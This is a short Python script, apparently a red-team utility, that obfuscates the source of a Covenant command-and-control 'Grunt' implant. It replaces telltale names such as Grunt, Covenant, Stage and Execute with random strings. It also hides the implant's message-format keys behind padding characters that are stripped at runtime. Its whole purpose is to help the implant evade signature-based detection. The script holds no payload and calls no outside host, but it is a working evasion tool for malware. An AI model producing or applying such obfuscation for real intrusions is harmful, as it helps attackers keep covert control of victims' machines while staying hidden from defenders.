import argparse
import string
import random

parser = argparse.ArgumentParser(description="Grunt Obfuscator")
parser.add_argument('infile', metavar='in', type=str, help='stdin grunt.cs')
parser.add_argument('outfile', metavar='out', type=str, help='name of grunt output')
args = parser.parse_args()

try:
    payload = open(args.infile).read()
    newfile = open(args.outfile, "w+")
except IOError:
    print("Error reading from file")
    exit()
letters = string.ascii_lowercase

#Original Text
grunt = ''.join(random.choice(letters) for i in range(6))
covenant = ''.join(random.choice(letters) for i in range(6))
stager = ''.join(random.choice(letters) for i in range(6))
execute = ''.join(random.choice(letters) for i in range(6))
msgFormatString='string MessageFormat = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";'

#Obfuscated Text
new_stager = payload.replace("Grunt", grunt)
new_stager = new_stager.replace("Covenant", covenant)
new_stager = new_stager.replace("Stage", stager)
new_stager = new_stager.replace("Execute", execute)
newFormatString='string MessageFormat = @"{{""???G?U?I??D"":""{0}"",""T?y?p???e"":{1},""?M???e?t?a"":""{2}"",""?I?V?"":""{3}"",""??E?n?cry?pt?e?d?M?e???ss?a?g?e?"":""{4}"",""??H????M?A??C???"":""{5}""}}".Replace("?","");'

new_stager = new_stager.replace(msgFormatString, newFormatString)
newfile.write(new_stager)
newfile.close()
print("[+]remember to add GUID string to the second stage per the readme")
